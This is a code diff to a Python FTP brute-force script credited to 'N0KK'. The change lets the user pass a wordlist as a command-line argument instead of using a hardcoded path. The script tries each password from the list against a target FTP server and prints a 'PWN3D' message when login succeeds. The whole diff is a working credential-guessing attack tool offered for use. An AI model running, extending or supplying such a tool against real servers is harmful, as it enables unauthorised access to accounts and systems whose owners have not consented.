@@ -9,13 +9,14 @@ print("############## Developed by: N0KK ###############")
 print("#################################################")
 print("")
 
-if len(sys.argv) != 3:
-    print ("Modo de uso: python3 ftpbrute.py 127.0.0.1 user")
+if len(sys.argv) != 4:
+    print ("Modo de uso: python3 ftpbrute.py 127.0.0.1 user wordlist")
     sys.exit()
 target = sys.argv[1]
 user = sys.argv[2]
+wordlist_path = sys.argv[3]
 
-with open('/home/n0kk/wordlist.txt') as wordlist:
+with open(wordlist_path, 'r', encoding='ISO-8859-1') as wordlist:
     for word in wordlist.readlines():
         word = word.strip()  # remove newline characters
         print ("Running FTP Brute Force %s:%s"%(user,word))
@@ -33,7 +34,4 @@ with open('/home/n0kk/wordlist.txt') as wordlist:
 
         if re.search('230', resp):
             print ("[+] PWN3D ---->",word)
-            break 
-        
-            print("Incorrect")
-
+            break
